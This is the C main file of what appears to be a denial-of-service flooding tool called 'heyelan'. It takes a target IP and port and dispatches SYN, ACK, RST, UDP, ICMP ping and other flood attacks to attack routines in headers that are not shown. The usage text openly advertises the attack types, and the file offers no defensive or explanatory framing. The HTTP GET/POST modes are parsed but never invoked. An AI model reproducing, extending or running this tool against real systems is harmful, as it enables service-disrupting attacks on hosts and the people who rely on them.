#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include "tcp_attack.h"
#include "udp_attack.h"
#include "icmp_attack.h"
#include "http_attack.h"
#include "utils.h"
#include "types.h"

struct target_data target;

void signal_exit()
{
	close(target.sockfd);
}

void heyelan_usage(char *argv[])
{
	fprintf(stdout, "\nusage: %s [attack type] [options]\n\n\
attack types:\n\n\
\tsyn : SYN flood attack\n\
\tack : ACK flood attack\n\
\tsynack : SYN-ACK flood attack\n\
\tpshack : PSH-ACK flood attack\n\
\tackfin : ACK-FIN flood attack\n\
\trst : RST flood attack\n\
\tall : all flags flood attack\n\
\tnull : no flags flood attack\n\
\tudp : UDP flood attack\n\
\tget : HTTP GET flood attack\n\
\tpost : HTTP POST flood attack\n\
\tping : ICMP ping flood attack\n\n\
options:\n\n\
\t-t [target IP address] : target IP address to attack\n\
\t-p [target port] : target port to attack\n\
\t-h : help message\n\n", argv[0]);
	exit(EXIT_FAILURE);
}

void parse_args(int argc, char *argv[])
{
	int opt;

	if (argc < 3) {
		heyelan_usage(argv);
	}

	/* what a mess */
	if (!strncmp(argv[1], "syn", 3) && strlen(argv[1]) == 3)
		target.attack_type = ATTACK_TCP_SYN;
	else if (!strncmp(argv[1], "ack", 3) && strlen(argv[1]) == 3)
		target.attack_type = ATTACK_TCP_ACK;
	else if (!strncmp(argv[1], "synack", 6))
		target.attack_type = ATTACK_TCP_SYNACK;
	else if (!strncmp(argv[1], "pshack", 6))
		target.attack_type = ATTACK_TCP_PSHACK;
	else if (!strncmp(argv[1], "ackfin", 6))
		target.attack_type = ATTACK_TCP_ACKFIN;
	else if (!strncmp(argv[1], "rst", 3))
		target.attack_type = ATTACK_TCP_RST;
	else if (!strncmp(argv[1], "all", 3))
		target.attack_type = ATTACK_TCP_ALL;
	else if (!strncmp(argv[1], "null", 4))
		target.attack_type = ATTACK_TCP_NULL;
	else if (!strncmp(argv[1], "udp", 3))
		target.attack_type = ATTACK_UDP;
	else if (!strncmp(argv[1], "get", 3))
		target.attack_type = ATTACK_HTTP_GET;
	else if (!strncmp(argv[1], "post", 4))
		target.attack_type = ATTACK_HTTP_POST;
	else if (!strncmp(argv[1], "ping", 4))
		target.attack_type = ATTACK_ICMP_PING;

	while ((opt = getopt(argc, argv, "t:p:h")) != -1) {
		switch (opt) {
		case 't':
			inet_pton(AF_INET, optarg, &target.target_addr);
			break;
		case 'p':
			target.target_port = atoi(optarg);
			break;
		case 'h':
			heyelan_usage(argv);
			break;
		case '?':
			break;
		}
	}
}

int main(int argc, char *argv[])
{
	memset(&target, 0, sizeof(struct target_data));
	parse_args(argc, argv);

	if (!target.target_addr) {
		fprintf(stdout, "target address not specified, aborting.\n");
		exit(EXIT_FAILURE);
	}

	init_signal(&signal_exit);

	if (target.attack_type >= ATTACK_TCP_SYN && target.attack_type <= ATTACK_TCP_NULL)
		attack_tcp(&target);
	else if (target.attack_type == ATTACK_UDP)
		attack_udp(&target);
	else if (target.attack_type == ATTACK_ICMP_PING)
		attack_icmp_ping(&target);

	return 0;
}
